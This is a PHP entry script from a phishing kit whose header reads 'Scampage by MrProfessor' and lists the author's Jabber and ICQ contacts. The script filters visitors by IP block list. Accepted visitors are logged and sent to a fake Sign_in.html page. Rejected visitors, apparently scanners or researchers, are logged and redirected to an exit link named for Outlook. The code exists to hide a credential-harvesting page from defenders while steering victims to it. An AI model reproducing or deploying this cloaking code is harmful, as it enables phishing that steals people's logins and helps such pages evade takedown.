<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require_once("includes/functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'],
);

$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
		session_start();
        $_SESSION['page_a_visited'] = true;
		header('Location: Sign_in.html');
		exit;
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
		header("Location: ".$ExitLinkOutlook);
		die();
		}
}
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
?>
